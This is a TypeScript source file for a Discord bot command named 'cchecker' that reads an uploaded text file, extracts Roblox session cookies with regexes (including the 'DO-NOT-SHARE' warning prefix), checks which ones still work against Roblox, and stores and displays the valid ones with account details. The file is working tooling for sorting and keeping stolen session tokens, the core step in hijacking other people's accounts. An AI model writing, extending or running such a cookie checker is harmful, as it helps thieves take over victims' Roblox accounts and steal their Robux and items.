import {
  SlashCommandBuilder,
  PermissionFlagsBits,
  type ChatInputCommandInteraction,
} from 'discord.js';
import axios from 'axios';
import { validateCookie } from '../roblox';
import { buildAccountCard, successHeader, errorHeader, ansiBlock } from '../ui';
import { storeAndBuildRow } from './refresh-cookie';
import type { Command } from './types';

// ─── Cookie extraction ─────────────────────────────────────────────────────

const FULL_COOKIE_RE = /_\|WARNING:-DO-NOT-SHARE-THIS\.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items\.\|_CAEQ[A-Za-z0-9._\-+=\/]+/g;
const BARE_COOKIE_RE = /CAEQ[A-Za-z0-9._\-+=\/]{50,}/g;

function extractCookies(text: string): string[] {
  const fullMatches    = [...text.matchAll(FULL_COOKIE_RE)].map(m => m[0]);
  const fullBareValues = new Set(
    fullMatches.map(m => m.slice(m.indexOf('|_CAEQ') + 2)),
  );

  const bareMatches = [...text.matchAll(BARE_COOKIE_RE)]
    .map(m => m[0])
    .filter(v => !fullBareValues.has(v));

  const seen   = new Set<string>();
  const result: string[] = [];

  for (const full of fullMatches) {
    const bare = full.slice(full.indexOf('|_CAEQ') + 2);
    if (!seen.has(bare)) { seen.add(bare); result.push(full); }
  }
  for (const bare of bareMatches) {
    if (!seen.has(bare)) { seen.add(bare); result.push(bare); }
  }

  return result;
}

// ─── Command definition ────────────────────────────────────────────────────

const data = new SlashCommandBuilder()
  .setName('cchecker')
  .setDescription('Check a .txt file of Roblox cookies and report valid ones')
  .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
  .addAttachmentOption(opt =>
    opt.setName('file')
      .setDescription('A .txt file containing cookies')
      .setRequired(true),
  ) as SlashCommandBuilder;

async function execute(interaction: ChatInputCommandInteraction): Promise<void> {
  await interaction.deferReply({ ephemeral: true });

  const attachment = interaction.options.getAttachment('file', true);

  if (!attachment.name?.endsWith('.txt') && !attachment.contentType?.includes('text')) {
    await interaction.editReply(errorHeader('Wrong File Type', 'Please attach a .txt file.'));
    return;
  }

  let fileContent: string;
  try {
    const resp = await axios.get<string>(attachment.url, { responseType: 'text', validateStatus: () => true });
    fileContent = resp.data;
  } catch (err: any) {
    await interaction.editReply(errorHeader('Download Failed', err.message));
    return;
  }

  const cookies = extractCookies(fileContent);

  if (cookies.length === 0) {
    await interaction.editReply(
      errorHeader('No Cookies Found', 'File must contain _|WARNING...|_CAEQ… or bare CAEQ… tokens.'),
    );
    return;
  }

  await interaction.editReply(
    ansiBlock(`\x1B[1;36m🔍  Scanning ${cookies.length} cookie(s)…\x1B[0m`),
  );

  let validCount = 0;

  for (const cookie of cookies) {
    const result = await validateCookie(cookie);
    if (!result.valid) continue;

    validCount++;
    const row = storeAndBuildRow(cookie);

    await interaction.followUp({
      content: successHeader(`Valid Cookie #${validCount}`) + '\n' + buildAccountCard(result),
      components: [row],
      ephemeral: true,
    });
  }

  const summaryContent = validCount === 0
    ? errorHeader('No Valid Cookies', `Checked all ${cookies.length} — none were valid.`)
    : successHeader('Scan Complete', `${validCount} valid / ${cookies.length} total`);

  await interaction.followUp({ content: summaryContent, ephemeral: true });
}

export const ccheckerCommand: Command = { data, execute };
